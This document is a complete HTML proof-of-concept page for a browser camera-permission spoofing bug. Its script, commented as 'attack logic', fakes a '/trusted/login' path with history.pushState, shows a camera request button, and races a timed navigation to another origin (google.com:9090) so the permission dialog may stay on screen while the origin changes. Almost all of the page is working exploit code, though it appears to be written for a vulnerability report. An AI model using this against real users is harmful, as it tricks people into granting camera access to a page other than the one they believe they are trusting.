<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Camera Permission Dialog Persistence PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
.notice{margin-top:14px;font-size:13px;color:#b00020}
video{width:100%;max-width:360px;border-radius:12px;margin-top:10px}
</style>
</head>

<body>

<h2 style="margin-top:60px;">Camera Permission Dialog Persistence PoC</h2>
<p>Observe camera permission dialog during navigation</p>

<button id="start">Start PoC</button>

<div id="panel">
  <h3>Request Camera Access</h3>
  <p>Permission dialog appears during pending navigation</p>
  <button onclick="reqCamera()">📷 Enable Camera</button>
  <p id="output">Result: -</p>
  <video id="preview" autoplay muted playsinline></video>
  <div class="notice">
    Demo only — permission dialog may persist while origin changes
  </div>
</div>

<script>
const panel  = document.getElementById('panel');
const output = document.getElementById('output');
const preview = document.getElementById('preview');

/* ================= CAMERA ================= */
function reqCamera(){
  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
    output.textContent = 'Camera API not supported';
    return;
  }

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      output.textContent = 'Camera granted';
      preview.srcObject = stream;
    })
    .catch(err => {
      output.textContent = 'Camera denied / error';
    });
}

/* ================= ATTACK LOGIC ================= */
/* Step 1: Fake trusted path */
document.getElementById('start').onclick = () => {
  history.pushState({}, '', '/trusted/login');
  panel.style.display = 'block';
};

/* Step 2: Navigation race (TARGET DI AKHIR) */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090/#https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
